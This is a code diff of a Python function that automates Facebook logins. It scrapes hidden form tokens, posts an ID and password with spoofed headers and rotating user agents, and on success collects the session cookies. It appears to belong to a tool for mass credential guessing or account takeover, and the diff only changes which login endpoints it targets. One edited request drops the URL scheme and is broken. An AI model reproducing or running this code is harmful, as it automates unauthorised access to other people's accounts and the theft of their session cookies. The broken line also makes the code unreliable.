@@ -2473,7 +2473,7 @@ def m5(idf,pwv):
     + ') AppleWebKit/537.36 (KHTML, like Gecko) '
     + random.choice(chrome_version)
     + ' Mobile Safari/537.36')
-   free_fb = session.get('https://m.facebook.com').text
+   free_fb = session.get('mobile.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -2485,7 +2485,7 @@ def m5(idf,pwv):
             "pass":ps,
             "login":"Log In"}
    header_freefb ={
-    "authority": "mbasic.alpha.facebook.com",
+    "authority": "mobile.facebook.com",
     "method": "POST",
     "path": "/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",
     "scheme": "https",
@@ -2496,7 +2496,7 @@ def m5(idf,pwv):
     "Content-Length": "142",
     "Content-Type": "application/x-www-form-urlencoded",
     "Dpr": "1",
-    "Origin": "https://mbasic.alpha.facebook.com",
+    "Origin": "https://mobile.facebook.com",
     "Priority": "u=0, i",
     "Referer": "https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
     "Sec-Ch-Prefers-Color-Scheme": "dark",
@@ -2511,9 +2511,9 @@ def m5(idf,pwv):
     "Sec-Fetch-Site": "same-origin",
     "Sec-Fetch-User": "?1",
     "Upgrade-Insecure-Requests": "1",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "User-Agent": user_agent,
     "Viewport-Width": "885"}
-   lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
